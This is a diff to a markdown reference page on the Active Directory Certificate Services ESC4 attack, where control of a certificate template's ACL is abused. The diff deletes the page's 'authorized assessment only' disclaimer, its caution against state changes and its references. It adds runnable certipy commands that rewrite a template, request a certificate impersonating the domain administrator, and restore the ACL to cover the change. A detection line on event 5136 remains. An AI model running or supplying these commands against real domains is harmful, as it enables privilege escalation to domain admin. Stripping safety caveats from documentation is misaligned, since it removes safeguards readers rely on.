@@ -10,21 +10,32 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC4 (template ACL control)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **Certificate template object** — `nTSecurityDescriptor` (WriteOwner / WriteDacl / GenericAll).
 
-## Detection
+### Concept (deep)
+The attacker holds **write access on a template**, edits it to allow **SAN supply**, exploits it as ESC1, then **restores the original ACL**. This is a **state-changing** attack and must be authorised.
+
+### Commands
+```bash
+# ── Modify template to enable SAN supply ────────────────────────────
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template VulnerableTemplate -save-old
+
+# ── Exploit as ESC1 ──────────────────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template VulnerableTemplate \
+  -upn administrator@corp.local
+
+# ── Restore the original ACL ─────────────────────────────────────────
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template VulnerableTemplate -restore
+```
+
+### Detection
 **5136** on `pKICertificateTemplate`; monitor template ACL changes and `msPKI-*` attribute edits.
 
 ---
-
-## References
-
-- [Microsoft: Certificate template concepts](https://learn.microsoft.com/windows-server/identity/ad-cs/certificate-template-concepts)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
